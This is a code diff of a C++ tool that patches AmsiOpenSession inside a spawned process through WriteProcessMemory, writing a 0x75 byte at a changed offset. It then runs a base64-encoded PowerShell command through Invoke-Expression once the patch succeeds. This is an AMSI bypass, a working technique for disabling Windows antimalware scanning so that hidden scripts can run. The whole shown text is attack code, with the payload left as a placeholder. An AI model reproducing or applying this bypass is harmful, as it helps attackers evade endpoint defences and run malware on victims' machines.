@@ -67,22 +67,22 @@ bool patch_amsi(PROCESS_INFORMATION pi) {
     );
     HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
     bool success = false;
-    if (ams_dll != NULL) {
-        FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
-        char* addr_ptr = reinterpret_cast<char*>(addr) + 3;
-        const char new_value[] = { 0x75 };
-        SIZE_T size = sizeof(new_value);
-        SIZE_T bytes_written;
-       
-        if (WriteProcessMemory(
-            hProcess, 
-            addr_ptr, 
-            new_value,
-            size, 
-            &bytes_written) != 0) 
-        {
-            success = true;
-        }
+    if (ams_dll != NULL) {	
+		FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
+		int offset = 0xA;
+		char* addr_ptr = reinterpret_cast<char*>(addr) + offset;
+		const char new_value[] = { 0x75 };
+		SIZE_T size = sizeof(new_value);
+		SIZE_T bytes_written;
+		if (WriteProcessMemory(
+			hProcess,
+			addr_ptr,
+			new_value,
+			size,
+			&bytes_written) != 0)
+		{
+			success = true;
+		}
      
         CloseHandle(hProcess);
         FreeLibrary(ams_dll);
@@ -152,6 +152,7 @@ int main()
         return EXIT_FAILURE;
     }
     
+	
     if (patch_amsi(pi)) {
         std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
         WORD length = static_cast<WORD>(command.length());
